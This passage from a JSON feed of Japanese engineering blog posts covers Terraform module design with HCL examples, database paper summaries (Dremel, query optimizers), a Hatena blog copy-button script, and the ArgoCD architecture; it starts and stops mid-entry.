を出力してくれるコマンドを作った話","contentSnippet":"前段 Sreake事業部の橋本です。 ChatGPTで話題のOpenAIのモデルは、現在画像の取り扱いはまだ発展途上です。文章から画像を作るAPIや画像入力が検討されていますが、システム運用にクリティカルに使えそうになる […]The post OpenAI API を利用して Terraform から構成図っぽい Mermaid を出力してくれるコマンドを作った話 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/mermaid-with-openai-api/","isoDate":"2023-06-06T02:44:12.000Z","dateMiliSeconds":1686019452000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Redis公式のGoクライアントライブラリrueidisを試してみた","contentSnippet":"This 記事 is 何？Twitterぼんやり見てたらRedis公式のGo用クライアントライブラリが出てたとかで、自身のプロジェクトにどの程度簡単に入れられるのかなーと思い試してみました。公式…","link":"https://qiita.com/bayobayo0324/items/8ac3e27eef360a316ad2","isoDate":"2023-05-31T12:02:25.000Z","dateMiliSeconds":1685534545000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"日本のビットコイン決済を振り返る","contentSnippet":"https://cryptocurrency.connpass.com/event/280644/\\r2023年5月ビットコインとかミートアップでビットコイン決済についてLTしました。","link":"https://speakerdeck.com/shukob/ri-ben-nohitutokoinjue-ji-wozhen-rifan-ru","isoDate":"2023-05-27T04:00:00.000Z","dateMiliSeconds":1685160000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"OLAPデータベースを支える技術","contentSnippet":"今年に入ってからCarnegie Mellon UniversityのAdvanced Database SystemsでReading Assignmentとして出ている論文リストで必須とされているものや講義資料を読みました。https://nnaka2992.hatenablog.com/archive/category/論文この記事では紹介されていた論文やAdvanced Database Systemsの講義資料・動画を振り替えることで、BigQueryやRedShift、Snowflakeといった最新の分析用データベースがどのように優れたパフォーマンスを実現しているかを考え...","link":"https://zenn.dev/nnaka2992/articles/technics_behind_analytical_database","isoDate":"2023-05-25T00:02:49.000Z","dateMiliSeconds":1684972969000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Kubernetes の運用効率化を ChatGPT-4 で実現する 障害対応編","contentSnippet":"1. はじめに はじめまして、Sreake事業部インターン生の井上秀一です。 Sreake事業部はSRE関連技術に強みを持つエンジニアによるコンサルテーションサービスを提供する事業部であり、私たちもSRE技術の調査と研究 […]The post Kubernetes の運用効率化を ChatGPT-4 で実現する 障害対応編 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/kubernetes-operation-with-chatgpt4/","isoDate":"2023-05-22T23:46:38.000Z","dateMiliSeconds":1684799198000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Terraform Modules で再利用できるので最高ではないでしょうか？","contentSnippet":"概要ModuleはTerraformの複数のリソースをまとめて再利用可能な単位として扱うことができます。Moduleを使うことで複雑なリソース構成を抽象化し、システムの構造の把握やリソース構成の再利用が可能になり、読みやすさや可読性が向上し、修正箇所が単一になるなどのメリットがあります。ただし、理解には初期コストが必要です。Moduleの設計では、1つの機能を持つように小さくシンプルに保つことが重要で、それが難しい場合は大抵複雑と言えます。また、公式のModuleを利用することで、自身で定義やドキュメントの整備、メンテナンスの手間を省きつつ、プロジェクトを超えて共通認識として扱えるため、Module理解のコストが減ります。しかし、どのタイミングでModuleに組み込むかの正解は、個々のプロジェクトの特性や開発チームの状況により大いに変わるでしょう。絶えず試行錯誤を繰り返しながら個々のプロジェクトごとに最適な解を見つけることが求められます。このブログではそれらの話の前にTerraform Modulesについて利用方法をまとめてみました。概要Module を利用するmoduleの使い方moduleの入力ローカルをうまく利用するmoduleの出力module を使ったときの失敗についてバージョン状態の差分は可能な限り小さくすべきアップグレードは自動されるべきファイルパスインラインブロックいい感じのデフォルトの変数最後に参考Module を利用するシステムを構築するにあたって開発、検証、本番環境をそれぞれ用意することが多いですが、Terraformを環境ごと（例：開発環境、ステージング環境、本番環境）にシンプルなWebサーバーの構成を例にしてModuleを使わないときと使ったときの構成を比較してみましょう。Terraform Configuration|--- Development Environment|   |--- VM Instances (Web servers)|   |--- Firewall Rules (Allow HTTP/HTTPS traffic to the web servers)|   |--- Load Balancer (Balance traffic among VM instances)|   |--- Storage Bucket (Store static content)|--- Staging Environment|   |--- VM Instances (Web servers)|   |--- Firewall Rules (Allow HTTP/HTTPS traffic to the web servers)|   |--- Load Balancer (Balance traffic among VM instances)|   |--- Storage Bucket (Store static content)|--- Production Environment|   |--- VM Instances (Web servers)|   |--- Firewall Rules (Allow HTTP/HTTPS traffic to the web servers)|   |--- Load Balancer (Balance traffic among VM instances)|   |--- Storage Bucket (Store static content)この構成では、 環境毎にVM Instances 、Firewall Rules 、 Load Balancer 、Storage Bucket などのリソースが定義されていて環境間で異なるリソース設定を利用します。一方、moduleを使用した場合の構成は以下のようになります。Terraform Configuration|--- modules|   |--- user_service_cluster|       |--- main.tf|       |   |--- VM Instances (Web servers)|       |   |--- Firewall Rules (Allow HTTP/HTTPS traffic to the web servers)|       |   |--- Load Balancer (Balance traffic among VM instances)|       |   |--- Storage Bucket (Store static content)|       |--- variables.tf|       |--- output.tf|--- Development Environment|   |--- User-Service-Cluster  Module (source: ../modules/user_service_cluster)|--- Staging Environment|   |--- User-Service-Cluster Module (source: ../modules/user_service_cluster)|--- Production Environment|   |--- User-Service-Cluster  Module (source: ../modules/user_service_cluster)この構成では、 user_service_cluster moduleのmain.tfファイル内にVM Instances 、Firewall Rules 、 Load Balancer 、Storage Bucket などのリソースが定義されています。各環境はこのuser_service_clustermoduleを参照しており、環境間で共通のリソース設定を再利用します。これによって再利用性、可読性が上がり維持管理性を高める事ができると思います。moduleの使い方Terraformの moduleは、リソース設定の再利用可能な部品で、コードの抽象化と組織化をサポートします。 moduleは一つ以上のリソースを定義し、それらをまとめて管理することができます。 moduleを使用するためには、 moduleブロックをmain.tf（またはその他の.tfファイル）に追加し、そこでmoduleのソースと任意の入力変数を指定します。以下に、user_service_cluster moduleを使用するための基本的なmodule ブロックの例を示します。module \\"user_service_cluster\\" {  source = \\"../modules/user_service_cluster\\"  instance_type  = \\"n1-standard-1\\"  instance_count = 3  firewall_rules = {    allow_http  = true    allow_https = true  }  load_balancer_config = {    protocol = \\"HTTP\\"    port     = 80  }  bucket_name = \\"dev-bucket\\"}source属性にmoduleのソースコードが存在するパスを指定しています。そして、user_service_cluster moduleが定義する各入力変数を設定しています。moduleは、そのソース内でvariableブロックを使用して入力変数を定義します。これらの入力変数は、moduleの使用者が値を提供することでmoduleの振る舞いをカスタマイズできます。また、moduleはoutputブロックを使用して出力値を定義します。出力値は、moduleの内部リソースの属性をmoduleの外部に公開するために使用されます。これにより、他のリソースやmoduleがmoduleから生成されるリソースを参照することが可能になります。module化はTerraformのコードベースを組織化し、再利用可能なコードを作成するための重要な手段です。これにより、一貫性が保たれ、メンテナンスが容易になり、エラーの可能性も低減します。moduleの入力Terraformのmoduleは再利用可能なコードブロックで、入力変数（input variables）を使用してカスタマイズできます。これらの入力変数は、moduleブロックで設定します。以下に、user_service_cluster moduleで使用する入力変数の例を示します。まず、module自体のvariables.tfファイルには以下のように入力変数を定義しますvariable \\"instance_type\\" {  description = \\"The type of instance to start\\"  type        = string  default     = \\"n1-standard-1\\"}variable \\"instance_count\\" {  description = \\"Number of instances to create\\"  type        = number  default     = 1}variable \\"firewall_rules\\" {  description = \\"Firewall rules for instances\\"  type        = map(any)  default     = {}}variable \\"load_balancer_config\\" {  description = \\"Configuration for load balancer\\"  type        = map(any)  default     = {}}variable \\"bucket_name\\" {  description = \\"Name of the storage bucket\\"  type        = string  default     = \\"default-bucket\\"}そして、このmodule を呼び出す際に、具体的な値を設定します：module \\"user_service_cluster\\" {  source = \\"../modules/user_service_cluster\\"  instance_type  = \\"n1-standard-1\\"  instance_count = 3  firewall_rules = {    allow_http  = true    allow_https = true  }  load_balancer_config = {    protocol = \\"HTTP\\"    port     = 80  }  bucket_name = \\"dev-bucket\\"}上記の例では、user_service_cluster moduleはsourceで指定されたソースからロードされ、instance_type、instance_count、firewall_rules、load_balancer_config、bucket_nameという入力変数を設定しています。module に入力変数を提供することで、module の動作をカスタマイズし、異なる環境や条件で再利用することが可能になります。ローカルをうまく利用するTerraformのlocalsブロックを使用すると、再利用可能な内部変数をmodule内で定義することができます。localsはmodule内で共有され、module外からは参照できません。以下に、user_service_cluster module のlocalsの例を示します。この例では、HTTPポート、任意のポート、任意のプロトコル、TCPプロトコル、そして全てのIPアドレスをローカル変数として定義しています。locals {  http_port    = 80  any_port     = 0  any_protocol = \\"-1\\"  tcp_protocol = \\"tcp\\"  all_ips      = [\\"0.0.0.0/0\\"]}ローカル変数はlocal.<NAME>の形式で参照します。以下のリソース定義では、ロードバランサーリスナーとセキュリティグループの設定にローカル変数を使用しています。resource \\"google_compute_instance\\" \\"http\\" {  name         = \\"web-instance\\"  machine_type = \\"n1-standard-1\\"  network_interface {    network = \\"default\\"    access_config {      // Assign an ephemeral IP to the instance    }  }    // Other configuration...}resource \\"google_compute_firewall\\" \\"default\\" {  name    = \\"default-firewall\\"  network = \\"default\\"  allow {    protocol = local.tcp_protocol    ports    = [local.http_port]  }  source_ranges = local.all_ips}上記の例では、ロードバランサーリスナーとセキュリティグループでlocalsブロックに定義したローカル変数を参照しています。local.http_port、local.tcp_protocol、local.all_ipsを各リソースブロックで参照することで、コードがDRYに保たれ、より読みやすく、メンテナンスがしやすくなります。localsブロックを使用することで、コードの冗長性を減らし、module全体の一貫性を保つことができます。また、ローカル変数を使用することで、moduleの一部で使用する変数をmodule全体で共有することが可能になります。moduleの出力Terraformのmoduleは、出力変数（outputs）を提供できます。出力変数はmoduleの値を外部に公開するための手段で、moduleを使用しているコードからアクセスできます。また、Terraformがapplyコマンドを実行した後にこれらの値を表示することもできます。以下に、user_service_cluster moduleの出力変数の例を示します。この例では、output.tf にクラスタのURLとインスタンスのIDを出力しています。output \\"cluster_url\\" {  description = \\"The URL of the load balancer for the cluster\\"  value       = \\"http://${google_compute_global_address.default.address}\\"}output \\"instance_ids\\" {  description = \\"The IDs of the instances in the cluster\\"  value       = google_compute_instance.default.*.id}これらの出力をmodule の使用側でアクセスするためには、moduleの名前と出力の名前を組み合わせて参照します。output \\"user_service_cluster_url\\" {  description = \\"The URL of the load balancer for the user service cluster\\"  value       = module.user_service_cluster.cluster_url}output \\"user_service_cluster_instance_ids\\" {  description = \\"The IDs of the instances in the user service cluster\\"  value       = module.user_service_cluster.instance_ids}このようにして、moduleの出力変数を使用することで、moduleの内部データをmodule外部に公開し、他のTerraformコードがそのデータを参照できるようにします。出力変数はmodule間の情報共有を可能にし、moduleの再利用性を向上させます。Terraformはファイル名に特別な意味を持たせません。すなわち、variables.tfやoutputs.tfという名前は慣習にすぎないので、入力変数と出力変数を1つのファイルにまとめることも技術的には可能です。module を使ったときの失敗についてmodule を作る時に注意する点について実際にハマったことをベースに3つ紹介します。バージョンModuleのバージョンが異なると意図しない挙動やエラーが引き起こされる可能性があるので、バージョンを固定し実行環境を統一しましょう。Providerやパッケージにしても同じでバージョンを指定して再利用性を高めろ！！！状態の差分は可能な限り小さくすべきいつでもアップグレードを状態差分なしで行うことはできません。依存するリソースの変更やセキュリティ問題ができるだけ早くパッチを適用する必要があるなど、破壊的な変更を導入する必要がある場合があります。その場合、コストをどのように減らすかについて考える必要があります。状態の差分が少なければ、アップグレードのコストは少なくなります。破壊的な変更を導入するときは、それを文書化できるCHANGELOGやユーザーガイドを通じてユーザーに伝える必要がありますアップグレードは自動されるべきアップグレードは長期的に開発されるソフトウェアの最も重要なタスクの一つです。ただし、一般的に使用され、広く使用されているTerraform Moduleの場合、これは大きな問題でもあります。また、Moduleを頻繁に更新する場合、自動アップデートの機能を準備する必要があります。ユーザーにアップグレードを依頼しても、通常、彼らはより重要なタスクを行うためにそれを行うことはありません。そのため、代わりに、彼らのためにPRを作成します。PRがTerraformの差分がない場合に自動的にマージされるメカニズムを持っています。これと後方互換性の維持の組み合わせにより、最新バージョンのModuleを使用するユーザーの率を増やすことができますファイルパスTerraformのtemplatefile関数を使用する際、ファイルパスは絶対パスではなく相対パスを使用する必要があります。しかし、これはどのパスに対して相対的なのでしょうか？デフォルトでは、Terraformはパスを現在の作業ディレクトリに対して相対的に解釈します。そのため、terraform applyを実行しているディレクトリと同じディレクトリにTerraform設定ファイルがある場合、これはうまく動作します。しかし、別のフォルダに定義されたmodule内でtemplatefileを使用する場合、これは問題となります。この問題を解決するためには、path.moduleなどのパス参照を使用します。これを使用すると、module自体に対する相対パスが得られます。インラインブロックTerraformリソースの一部の設定は、インラインブロックか別のリソースとして定義することができます。インラインブロックとは、リソース内で設定する引数のことで、次の形式を持っています。resource \\"xxx\\" \\"yyy\\" {  <NAME> {    [CONFIG...]  }}ここでNAMEはインラインブロックの名前（例えば、ingress）、CONFIGはそのインラインブロックに特有の一つ以上の引数（例えば、from_portやto_port）です。しかし、インラインブロックと別のリソースを混在して使用すると、Terraformの設計上、設定が衝突し互いに上書きされてエラーが発生します。したがって、どちらか一方を使用する必要があります。moduleを作成する際には、別のリソースを使用することを常に推奨します。これらの注意点を理解しておくことで、Terraformのmoduleをより効果的に利用することができます。いい感じのデフォルトの変数完全にカスタマイズできるModuleには魅力がないです。Moduleの変数には、80％のユーザーをカバーするスマートデフォルト値を持つべきです。ただし、同時に、通常のユーザーとは異なる方法でModuleを使用するパワーユーザーのための設定も用意するべきです。変数を変更したときに何が起こるかは、ユーザーにとって明白で予測可能でなければなりません。この設定は適切に設計され、安易に浅いインターフェースを持つべきではありません最後にmoduleを活用することで、インフラストラクチャの再利用性と効率性が大幅に向上します。開発者は証明済み、テスト済み、文書化済みのインフラストラクチャの一部を再利用できるようになるため、迅速かつ確実にシステムを構築できます。例えば、マイクロサービスのデプロイメントを定義するmoduleを作成し、各チームが数行のコードで自身のマイクロサービスを管理できるようにすることが可能です。しかし、このようなmoduleを複数のチームで活用するためには、module内のTerraformコードは柔軟性と設定可能性が必要です。異なるチームや状況に応じて、ロードバランサーなしの単一インスタンスやロードバランサー付きの複数インスタンスといった、さまざまなデプロイメント要件を満たすことができます。Terraformの柔軟な構文を活用することで、より多機能なmoduleを設計し、インフラストラクチャの構築を一層楽しく効果的に行うことができます。また、どれぐらいの規模からmodule化するのかなど迷う場面が多いと思いますがこの辺は経験としか言えずにみんな雰囲気でやっているなぁって思いました。このブログが伸びたらもっと実装に基づいた話をしていこうと思います。ちなみにベストプラクティスなんかは俺にはわからない。自分を信じても…信頼に足る仲間を信じても…誰にもわからない…今の構成が一番変更しやすくて誇れるものならそれが正解なんだとおもう。実践Terraform　AWSにおけるシステム設計とベストプラクティス (技術の泉シリーズ（NextPublishing）)作者:野村 友規インプレスR&DAmazon参考Terraform: Up & Running; Writing Infrastructure As CodeDeveloper/Terraform/Configuration Language/Modulesterraform-module/terraform-module-blueprinthttps://registry.terraform.io/namespaces/terraform-aws-moduleshttps://registry.terraform.io/namespaces/terraform-google-modulesHashiCorp LearnModule Creation - Recommended PatternAWSとTerraformで学ぶプロダクションレディなKubernetes 技術の泉シリーズ (技術の泉シリーズ（NextPublishing）)","link":"https://syu-m-5151.hatenablog.com/entry/2023/05/19/154346","isoDate":"2023-05-19T06:43:46.000Z","dateMiliSeconds":1684478626000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"GitLab トラブル事例紹介","contentSnippet":"本ドキュメントでは、トラブルシューティングの事例を取り上げ、それぞれのトラブルの原因調査の流れと判明した原因、解決方法について記載します。 また、トラブルシューティングを円滑に進められるように心がけていることをご紹介しま […]The post GitLab トラブル事例紹介 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/gitlab-trouble-case-study/","isoDate":"2023-05-16T02:23:30.000Z","dateMiliSeconds":1684203810000,"authorName":"Sreake","authorId":"Sreake"},{"title":"現在のDremelの実装を解説した論文を読みました ","contentSnippet":"この記事の趣旨2020年に発表されたBigQueryの元となったGoogle内で利用されている分析向けデータベースであるDremelの実装を解説した論文を読みました。Dremel: A Decade of Interactive SQL Analysis at Web Scale著者についてSergey Melnik, Andrey Gubarev, Jing Jing Long, Geoffrey Romer, Shiva Shivakumar, Matt Tolton,Theo Vassilakisら2010年のDremel発表論文の著者らと、Hossein Ahmadi, Dan Delorey, Slava Min, Mosha Pasumansky, Jeff ShuteらGoogleで分析ワークロードと分散処理に関わる著者らによる論文。概要BigQueryの元となったGoogleのDremelの10年間を振り替えってアーキテクチャについて説明した論文。Dremelは現代のクラウドネイティブ分析ツールで一般的になっている、計算リソースとストレージの分解、カラムナストレージ、in situデータ分析などを統合した最初のツールである。手法SQLの採用Googleでは殆どのデータはBigTableなどNoSQLデータベースで管理されていたため、SQLを用いないデータアクセスが主流であった。しかしトランザクション型ビッグデータシステムにおける、SQLの採用に共ないDremelでもSQLを採用した。ストレージの分離メモリの分離MapReduceのシャッフルのボトルネックを回避するためにDisaggregated Memory Shuffle Systemを採用した。In situデータ分析への対応DBMSへのデータロードを必要としないデータ分析のことで、DremelではGFSに移行するときにGoogle内で共有のストレージフォーマットを使用することでGoogle内のデータに対応した。加えてGoogle Cloud StorageやGoogle Drive、MySQL、BigTableなどからのデータ取得もフェデレーションとして対応した。サーバレスアーキテクチャフォールトトレラントリスタート、仮想スケジューリングユニットによりマルチテナントかつオンデマンドなリソースを提供可能とし、低価格な利用を可能とした。現在ではサーバレスアーキテクチャを進化させ、集中型スケジューリングやShuffle Persistent Layer、柔軟なDAG実行、動的クエリ実行などを実装することでより優れたサーバレスアーキテクチャを実現した。ネストデータにおけるカラムナストレージ[[32])]Figure 5Figure 6Figure 7クエリレイテンシの最小化インタラクティブな実行のレイテンシは大きくなる。それを解決するためにDremelではスタンバイサーバプール、マルチレベル実行ツリー、列指向スキーマ表現、CPUとIO負荷のバランス調整、ファイルオペレーションの再利用、保証されたキャパシティ、適合的なクエリスケーリングにより実現している。作業時間read27:5027:50author32:024:12summary68:5026:48","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/17_dremel","isoDate":"2023-05-15T02:14:20.000Z","dateMiliSeconds":1684116860000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Connection draining for Service type LoadBalancer","contentSnippet":"はじめにService リソースは Kubernetes のサービス検出を支えるコアリソースです。Service のデータプレーンとして kube-proxy を使用している場合は、各ノード上の iptables や ipvs を設定することで L4 負荷分散を実現しています。Kubernetes は、結果整合性 (Eventual Consistency) の上に成り立つ分散システムです。Kubernetes のコントロールプレーンが Pod を削除する時に、全てのノード上のルーティングルールを更新してから Pod を削除したりはしません。削除中の Pod にもトラフィックが流...","link":"https://zenn.dev/toversus/articles/1682d275ef1bb7","isoDate":"2023-05-11T09:43:47.000Z","dateMiliSeconds":1683798227000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"2022 年の Accelerate State of DevOps Report の内容をまとめてみた","contentSnippet":"１．はじめに Sreake 事業部でインターンしている村山です。インターンをするにあたり、DevOps の理解と最近の動向を掴むことが必要であると感じ、Accelerate State of DevOps Report  […]The post 2022 年の Accelerate State of DevOps Report の内容をまとめてみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/accelerate-state-of-devops-report-2022/","isoDate":"2023-05-11T05:07:56.000Z","dateMiliSeconds":1683781676000,"authorName":"Sreake","authorId":"Sreake"},{"title":"TiDBで学ぶNewSQLのアーキテクチャ for Beginners","contentSnippet":"はじめにこの記事ではNewSQLの特徴であるノード間の分散とトランザクションや分断耐性などがTiDBではどのような技術によって実現されているかを説明することを目的としています。Spannerの論文が2012年に発表されてから10年以上の年月が流れ、優れた論文や実装ドキュメント、個人による解説ブログなど技術的詳細について述べた資料は多くあります。加えてこの記事を入門的なものと位置づけているため各コンポーネントを網羅的に解説するというよりは、キーコンセプトをどのように実装しているのかを実験を混じえながら動作の実現方法の解説を中心に扱います。また今回はTiDBをベースに説明し...","link":"https://zenn.dev/nnaka2992/articles/learning_tidb_internal_for_beginner","isoDate":"2023-05-11T01:18:19.000Z","dateMiliSeconds":1683767899000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"はてなブログのコードブロックを”クリップボードにコピーする方法”について","contentSnippet":"はてなブログの設定から、Markdown記法で書いた記事にコードブロックのコピーボタンを自動的に追加することができます。また、こちらのブログは完全に非公式ですし自分のブログ以外では試してません。\uD83E\uDDBE デザインの設定まず、はてなブログの管理画面にログインし、デザイン設定を開きます。\uD83E\uDDBE CSS の設定を行うデザイン設定で、「カスタマイズ」タブをクリックし、「デザインCSS」を開きます。ここで、先ほど紹介したコピーボタンのスタイルを追加します。pre.code {  position: relative;}.copy-button {  position: absolute;  top: 4px;  right: 4px;  display: inline-block;  padding: 8px 16px;  border: none;  border-radius: 4px;  background-color: #1e90ff;  color: #ffffff;  cursor: pointer;  font-size: 14px;  font-weight: bold;  text-decoration: none;  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);  transition: background-color 0.3s, box-shadow 0.3s;  opacity: 0;  transition: opacity 0.3s;}pre.code:hover .copy-button {  opacity: 1;}.copy-button:hover {  background-color: #2980b9;  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4);}.copy-button:focus {  outline: none;}.copy-button:active {  box-shadow: none;  transform: translateY(2px);}\uD83E\uDDBE フッターHTMLの設定を行う 次に、「カスタマイズ」タブの「フッターHTML」に、以下のコードを追加します。<script>  document.addEventListener(\'DOMContentLoaded\', function() {    // コードブロックを取得    var codeBlocks = document.querySelectorAll(\'pre.code\');        // すべてのコードブロックにコピーボタンを追加    for (var i = 0; i < codeBlocks.length; i++) {      var copyButton = document.createElement(\'button\');      copyButton.className = \'copy-button\';      copyButton.textContent = \'Copy code\';      copyButton.onclick = function() {        var codeElem = this.parentNode.querySelector(\'code\') || this.parentNode;        var textArea = document.createElement(\'textarea\');        textArea.value = codeElem.textContent.replace(/Copy code$/, \'\'); // \\"Copy code\\" テキストを削除        document.body.appendChild(textArea);        textArea.select();        document.execCommand(\'copy\');        document.body.removeChild(textArea);      }      codeBlocks[i].appendChild(copyButton);    }  });</script>\uD83D\uDD0D 確認していくhttps://syu-m-5151.hatenablog.com/entry/2023/04/11/084428 にて確認","link":"https://syu-m-5151.hatenablog.com/entry/2023/05/09/181943","isoDate":"2023-05-09T09:19:43.000Z","dateMiliSeconds":1683623983000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"クエリオプティマイザの精度を検証した論文を読みました","contentSnippet":"この記事の趣旨2015年に発表されたクエリオプティマイザにおけるカーディナリティ推定とコストモデル、列挙アルゴリズムの貢献度を評価した論文を読んでいきます。How Good Are Query Optimizers, Really?著者についてViktor Leis、Andrey Gubichev、Atanas Mirchev、Peter Boncz、Alfons Kemper、Thomas Neumannらのグループによる論文。ほとんどのメンバーはDBMSにおける最適化について研究しているが、Atanas Mirchevはより統計や探索といった最適化よりの研究をしている。問題意識良い結合順序を見つけることはクエリの性能に対して大きな影響を与えるため、熱心に研究されてきた。古典的なクエリ最適化のアプローチでは以下のステップで動的計画方に基づいた最適化を行なう。1. 有効な結合順序の列挙1. カーディナリティ推定値を入力としたコストモデルの選択理論的にはカーディナリティとコストモデルの推定値が正確であれば、最適なクエリプランを選択することができる。しかし現実にはカーディナリティ推定は一様性や独立性といった単純化された仮定に基づいており、しばしばそのような仮定は間違っているため悲惨な計画を作成する。手法この論文ではカーディナリティ推定器の評価と正確なコストモデルの重要性の評価、そして列挙された結合順序の空間がどの程度影響するのかを以下の方法で検証し、貢献を行なっている。1. IMDBデータを用いたJoin Order BenchmarkというJOINにフォーカスしたベンチマークによる評価を行なう1. 実世界のデータセットにおける現実的なクエリを用いたE2Eの検証を行なう。1. クエリ性能に対するカーディナリティ・コストモデル・列挙アルゴリズムの貢献度を定量化し、最適なクエリプラン生成のためのガイドラインを策定している。作業時間read29:3829:38author33:083:30summary48:4414:36感想時間が無くまとめ途中で切り上げてしまった。やらないよりマシではあるものの、ちゃんと纏めるときにくらべて理解度に影響が出そうなので時間に余裕を持っておきたい。内容自体はGW中にPostgreSQLの実装を読んでいたこともあり、わりと理解しやすかった。","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/16_query_optimization_performance","isoDate":"2023-05-08T02:13:43.000Z","dateMiliSeconds":1683512023000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[Kubernetes 1.27] Dynamic Resource Allocation のいま","contentSnippet":"!Kubernetes 1.27 時点でアルファ機能のため、実装が大きく変わる可能性があります。 はじめにKubeCon Europe 2023 で KEP-3063 Dynamic Resource Allocation (DRA) についての深い話と DRA Resource Driver の実装方法の話があったので、kubernetes-sigs/dra-example-driver をベースに触りながら検証してみました。toVersus/fake-dra-driver で公開しています。Device Plugins 2.0: How to Build a Drive...","link":"https://zenn.dev/toversus/articles/fe2aa06f133b49","isoDate":"2023-05-06T02:11:55.000Z","dateMiliSeconds":1683339115000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"【ArgoCD\uD83D\uDC19】ArgoCDのマイクロサービスアーキテクチャと自動デプロイの仕組み","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️ArgoCDのアーキテクチャを構成するコンポーネントの種類についてArgoCDがマニフェストを自動デプロイする仕組みについてこの記事から得られる知識01. はじめに02. 概要アーキテクチャレイヤーコンポーネント仕組み(1) repo-serverによるクローン取得(2) application-controllerによるマニフェスト取得(3) application-controllerによるCluster確認(4) application-controllerによる処理結果保管(5) argocd-serverによるキャッシュ取得(6) 管理者のログイン(7) IDプロバイダーへの認証フェーズ委譲(8) dex-serverによる認証リクエスト送信(9) argocd-serverによる認可フェーズ実行(10) application-controllerによるマニフェストデプロイ03. repo-serverrepo-serverとは仕組み(1) InitContainerによるお好きなツールインストール & argocd-cliバイナリコピー(2) repo-serverによる認証情報取得(3) repo-serverのよるクローン取得とポーリング(4) repo-serverによるサイドカーコール(5) repo-serverによる暗号化キーと暗号化変数の取得(6) サイドカーによるプラグイン処理の取得(7) サイドカーによるプラグイン処理の実行04. application-controller、redis-serverapplication-controllerとはredis-serverとは仕組み(1) ArgoCD用Cluster管理者のkubectl applyコマンド(2) application-controllerによるArgoCD系カスタムリソースのReconciliation(3) application-controllerによるマニフェスト取得(4) application-controllerによるヘルスチェック(5) application-controllerによるマニフェスト差分検出(6) application-controllerによる処理結果保管(7) application-controllerによるマニフェストデプロイ05. dex-serverdex-serverとは仕組み(1) プロダクト用Cluster管理者のログイン(2) IDプロバイダーへの認証フェーズ委譲(3) dex-serverによる認可リクエスト作成(4) dex-serverによる認可リクエスト送信(5) IDプロバイダーによる認証フェーズ実施(6) argocd-serverによる認可フェーズ実施06. argocd-server (argocd-apiserver)argocd-serverとは仕組み(1) application-controllerによるヘルスチェック(2) application-controllerによるマニフェスト差分検出(3) application-controllerによる処理結果保管(4) application-controllerによる処理結果取得(5) プロダクト用Cluster管理者のログイン(6) Ingressコントローラーによるルーティング(7) IDプロバイダーへの認証フェーズ委譲(8) IDプロバイダーによる認証フェーズ実施(9) argocd-serverによる認可フェーズ実施(10) application-controllerによるマニフェストデプロイ07. アーキテクチャのまとめ08. おわりに謝辞記事関連のおすすめ書籍01. はじめにロケットに乗るタコのツラが腹立つわー。画像引用元：Argo Projectさて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、全プロダクト共有のArgoCD\uD83D\uDC19とAWS EKSをリプレイスしました。今回は、採用した設計プラクティスの紹介も兼ねて、ArgoCDのマイクロサービスアーキテクチャと自動デプロイの仕組みを記事で解説しました。ArgoCDは、kubectlコマンドによるマニフェストのデプロイを自動化するツールです。ArgoCDのアーキテクチャには変遷があり、解説するのは執筆時点 (2023/05/02) で最新の 2.6 系のArgoCDです。アーキテクチャや仕組みはもちろん、個々のマニフェストの実装にもちょっとだけ言及します。それでは、もりもり布教していきます\uD83D\uDE1702. 概要アーキテクチャレイヤーまずは、ArgoCDのアーキテクチャのレイヤーがどのようになっているかを見ていきましょう。ArgoCD公式から、コンポーネント図が公開されています。図から、次のようなことがわかります\uD83D\uDC47下位レイヤー向きにしか依存方向がなく、例えばコアドメインとインフラのレイヤー間で依存性は逆転させていない。レイヤーの種類 (UI、アプリケーション、コアドメイン、インフラ) とそれらの依存方向から、レイヤードアーキテクチャのようなレイヤーに分けている。特にコアドメインレイヤーが独立したコンポーネントに分割されており、マイクロサービスアーキテクチャを採用している。argo-cd/docs/developer-guide/architecture/components.md at v2.8.0 \xb7 argoproj/argo-cd \xb7 GitHub▶ ArgoCDのマイクロサービスアーキテクチャの分割単位についてアーキテクチャは、機能単位の分割方法を採用していると推測しています。本記事では詳しく言及しませんが、マイクロサービスアーキテクチャの分割方法には大小いくつかの種類があり、境界付けられたコンテキストで分割することがベタープラクティスと言われています\uD83D\uDE0E(境界付けられたコンテキストについても、ちゃんと記事を投稿したい...)機能単位による分割は、境界付けられたコンテキストのそれよりも粒度が小さくなります。Monolith to Microservices: Evolutionary Patterns to Transform Your Monolith (English Edition)▶ ArgoCDのマイクロサービスアーキテクチャの設計図についてアーキテクチャの設計図にコンポーネント図を使用しています。コンポーネント図では、依存方向 (そのコンポーネントがいずれのコンポーネントを使用するのか) に着目できます。そのため、これはマイクロサービス間の依存方向を視覚化するために有効なUML図です\uD83D\uDE46\uD83C\uDFFB‍Component Diagrams - Code With Engineering Playbookコンポーネント次に、コンポーネントの種類を紹介します。ArgoCDの各コンポーネントが組み合わさり、マニフェストの自動的なデプロイを実現します。ArgoCD (2.6系) のコンポーネントはいくつかあり、主要なコンポーネントの種類とレイヤーは以下の通りです\uD83D\uDC47 コンポーネント                       レイヤー              機能                                                                                                                                                                                                             argocd-server(argocd-apiserver)  UI・アプリケーション  